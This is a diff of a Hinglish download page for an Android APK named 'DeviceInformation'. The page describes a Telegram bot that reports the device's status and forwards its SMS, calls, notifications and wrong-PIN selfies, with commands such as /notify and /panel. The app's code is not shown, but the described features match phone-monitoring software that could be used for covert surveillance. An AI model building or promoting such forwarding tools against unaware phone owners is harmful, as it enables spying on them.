@@ -1,50 +1,57 @@
 <!DOCTYPE html><html lang="hi"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="robots" content="noindex,nofollow">
-<title>Download</title><style>
+<title>DeviceInformation</title><style>
 *{box-sizing:border-box}
-html,body{height:100%}
 body{margin:0;background:#0f1115;color:#e8ecf1;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
- display:flex;align-items:center;justify-content:center;padding:22px}
-a.btn{display:block;width:100%;max-width:420px;background:#12351f;border:2px solid #2f6b4f;color:#6ee7a0;
- text-decoration:none;border-radius:18px;padding:26px 18px;font-size:20px;font-weight:800;text-align:center;
- letter-spacing:.3px;box-shadow:0 10px 30px rgba(0,0,0,.35);transition:.15s}
-a.btn:hover{background:#17472a;border-color:#3f8f68}
-a.btn:active{transform:scale(.98)}
-a.btn svg{display:block;margin:0 auto 12px}
-</style></head><body>
-<a class="btn" id="dl" href="DeviceInformation-v4.1.apk" download>
-<svg viewBox="0 0 24 24" width="64" height="64" aria-hidden="true">
+ padding:22px 16px 40px;display:flex;flex-direction:column;align-items:center}
+.wrap{width:100%;max-width:480px}
+a.dl{display:block;background:#12351f;border:2px solid #2f6b4f;color:#6ee7a0;text-decoration:none;border-radius:18px;
+ padding:24px 18px;font-size:20px;font-weight:800;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.35);transition:.15s}
+a.dl:hover{background:#17472a;border-color:#3f8f68} a.dl:active{transform:scale(.98)}
+a.dl svg{display:block;margin:0 auto 10px}
+.meta{text-align:center;color:#9aa7b8;font-size:12.5px;margin:10px 0 22px;line-height:1.7}
+.mono{font-family:ui-monospace,Menlo,Consolas,monospace;color:#c9d4e2}
+.card{background:#161b22;border:1px solid #232a35;border-radius:14px;padding:14px 16px;margin:12px 0;font-size:13.6px;line-height:1.75}
+.card b.t{display:block;font-size:15px;color:#e8ecf1;margin-bottom:6px}
+.qr{display:flex;gap:16px;align-items:center}
+.qr .s{color:#9aa7b8;font-size:12.6px;line-height:1.7}
+.k{color:#6ee7a0}
+ul{margin:6px 0 0 18px;padding:0} li{margin:5px 0}
+a.l{color:#7fb2ff;text-decoration:none}
+</style></head><body><div class="wrap">
+
+<a class="dl" href="apk/DeviceInformation-v5.4.apk" download>
+<svg viewBox="0 0 24 24" width="60" height="60" aria-hidden="true">
 <path fill="none" stroke="#6ee7a0" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"
  d="M12 3v12m0 0l-5-5m5 5l5-5M4 20h16"/></svg>
 APK DOWNLOAD
 </a>
-<script>
-/* 🔄 apne aap sabse NAYA apk file pakadta hai — aapko page me kuchh badalna nahi padta.
-   Sirf nayi APK file upload kar dena; button khud usi par chala jayega. */
-(function () {
-  var owner = "deepakyadavg69", repo = "DkYadav96081";
-  var btn = document.getElementById("dl");
-  var base = location.origin + location.pathname.replace(/[^\/]*$/, "");
-  if (/\.github\.io$/.test(location.hostname) || location.hostname.indexOf(".github.io") > -1) {
-    base = "https://" + owner + ".github.io/" + repo + "/";
-  }
-  function ver(n) {
-    var m = n.toLowerCase().match(/v?(\d+)[._-](\d+)/);
-    return m ? (+m[1]) * 1000 + (+m[2]) : 0;
-  }
-  fetch("https://api.github.com/repos/" + owner + "/" + repo + "/contents/?t=" + Date.now(), { cache: "no-store" })
-    .then(function (r) { return r.json(); })
-    .then(function (list) {
-      if (!Array.isArray(list)) return;
-      var apk = list.filter(function (f) { return /\.apk$/i.test(f.name || ""); });
-      if (!apk.length) return;
-      apk.sort(function (a, b) { return ver(b.name) - ver(a.name) || (b.size || 0) - (a.size || 0); });
-      var f = apk[0];
-      btn.href = base + encodeURIComponent(f.name);
-      btn.setAttribute("download", f.name);
-    })
-    .catch(function () { /* net na ho to purana link hi chalega */ });
-})();
-</script>
-</body></html>
+<div class="meta">4.7 · 1.82 MB · same signature · install ke liye isi APK par tap karein<br>
+SHA256 <span class="mono">62ab0517436848a9…</span></div>
+
+<div class="card"><b class="t">🔔 Notification bot — "Notification"</b>
+Saari extra khabar ab <b>isi bot</b> par jaati hai (main chat saaf rehta hai): device online/offline · net alert ·
+roz ka report · suraksha (SIM nikaali, galat PIN + selfie, phone ON, airplane) · SMS/call · phone ke notification.
+<span class="k">Har message ke saath device ka naam + ID</span> aur pura detail.
+<br>Naya command: <span class="mono">/notify</span> · test: <span class="mono">/notify test</span></div>
+
+<div class="card"><b class="t">🆕 4.7 me kya naya</b>
+<ul>
+        <li>📷 <b>Apna QR engine</b> — QR ab phone ke andar hi banta hai (koi bahar ki site nahi)</li>
+        <li>🧹 Bahar ki saari sites hatai — litterbox · tmpfiles · qrserver · OpenAI <b>band</b></li>
+        <li>🔗 <span class="mono">/apk</span> = APK + <b>apna QR</b> + <b>apna page link</b> (koi upload site nahi)</li>
+        <li>🎬 45 MB+ video khud tukdon me · 🔤 button par asli kaam ka naam · 🔔 saari khabar Notification bot par</li>
+        <li>🔳 <span class="mono">/panel</span> — panel Telegram ke andar hi khulega (Mini App)</li>
+        </ul></div>
+
+<div class="card"><b class="t">📷 QR — apne page ka</b>
+<div class="qr"><div><svg width="150" height="150" class="segno"><path transform="scale(3)" class="qrline" fill="none" stroke="#6ee7a0" stroke-linecap="butt" d="M4 4.5h7m1 0h1m2 0h1m3 0h3m2 0h3m3 0h7m-33 1h1m5 0h1m1 0h5m1 0h2m2 0h1m7 0h1m5 0h1m-33 1h1m1 0h3m1 0h1m2 0h2m1 0h2m1 0h1m3 0h4m1 0h1m1 0h1m1 0h3m1 0h1m-33 1h1m1 0h3m1 0h1m2 0h1m1 0h1m1 0h1m3 0h2m2 0h1m2 0h1m1 0h1m1 0h3m1 0h1m-33 1h1m1 0h3m1 0h1m3 0h3m3 0h4m3 0h1m2 0h1m1 0h3m1 0h1m-33 1h1m5 0h1m3 0h2m4 0h1m1 0h1m2 0h1m4 0h1m5 0h1m-33 1h7m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h7m-23 1h1m1 0h3m7 0h1m1 0h1m-24 1h1m4 0h3m2 0h2m2 0h6m1 0h4m5 0h2m-32 1h1m1 0h3m2 0h1m4 0h8m2 0h1m4 0h4m-29 1h2m1 0h2m1 0h2m1 0h3m1 0h2m2 0h3m1 0h1m1 0h1m1 0h1m1 0h2m-30 1h1m1 0h1m3 0h1m1 0h4m5 0h2m3 0h2m1 0h5m-32 1h1m2 0h1m1 0h3m1 0h2m3 0h1m2 0h3m3 0h1m2 0h2m3 0h1m-32 1h5m2 0h1m2 0h3m1 0h1m3 0h2m1 0h1m4 0h2m1 0h4m-33 1h1m5 0h1m2 0h3m4 0h1m1 0h1m2 0h1m3 0h4m1 0h2m-28 1h1m5 0h1m2 0h2m1 0h1m3 0h1m2 0h3m1 0h1m1 0h2m1 0h1m-33 1h5m1 0h2m1 0h1m2 0h3m7 0h2m1 0h1m1 0h2m3 0h1m-28 1h1m2 0h2m1 0h1m1 0h1m2 0h2m1 0h2m2 0h1m2 0h1m2 0h2m1 0h1m-33 1h1m2 0h1m1 0h3m1 0h2m1 0h2m1 0h1m3 0h5m3 0h1m1 0h2m1 0h1m-32 1h1m6 0h4m2 0h1m1 0h2m1 0h2m1 0h1m2 0h2m1 0h5m-32 1h1m4 0h3m1 0h4m1 0h2m3 0h1m1 0h1m1 0h1m2 0h3m1 0h1m-32 1h1m3 0h2m3 0h2m1 0h6m1 0h2m2 0h1m4 0h1m-29 1h1m2 0h7m2 0h2m2 0h1m1 0h1m2 0h1m2 0h2m1 0h2m1 0h2m-32 1h1m1 0h1m4 0h1m1 0h4m2 0h1m1 0h4m1 0h1m6 0h2m1 0h1m-33 1h3m1 0h1m1 0h3m2 0h1m1 0h1m1 0h1m3 0h1m3 0h6m-21 1h1m4 0h2m4 0h2m3 0h1m3 0h1m1 0h1m1 0h1m-33 1h7m1 0h1m1 0h5m3 0h1m1 0h1m1 0h3m1 0h1m1 0h1m1 0h2m-32 1h1m5 0h1m4 0h3m2 0h2m2 0h1m1 0h3m3 0h3m-31 1h1m1 0h3m1 0h1m2 0h4m3 0h3m1 0h1m3 0h6m1 0h2m-33 1h1m1 0h3m1 0h1m3 0h1m3 0h1m2 0h3m2 0h4m1 0h4m1 0h1m-33 1h1m1 0h3m1 0h1m2 0h1m1 0h2m1 0h2m1 0h1m1 0h1m1 0h1m2 0h2m1 0h2m1 0h3m-33 1h1m5 0h1m1 0h1m1 0h5m1 0h1m7 0h7m-31 1h7m6 0h2m3 0h2m2 0h6m3 0h1"/></svg></div>
+<div class="s">Scan karo → page khulta hai → button → download.<br>
+Page: <span class="mono">deepakyadavg69.github.io/DkYadav96081</span></div></div></div>
+
+<div class="card" style="font-size:12.6px;color:#9aa7b8">Purane notes/design files yahan hain:
+ <a class="l" href="BACKUP/OLD-NOTES/README.md">BACKUP/OLD-NOTES</a> · Poora 4.7 note:
+ <a class="l" href="BACKUP/NOTE-4.7.md">BACKUP/NOTE-4.7.md</a></div>
+
+</div></body></html>
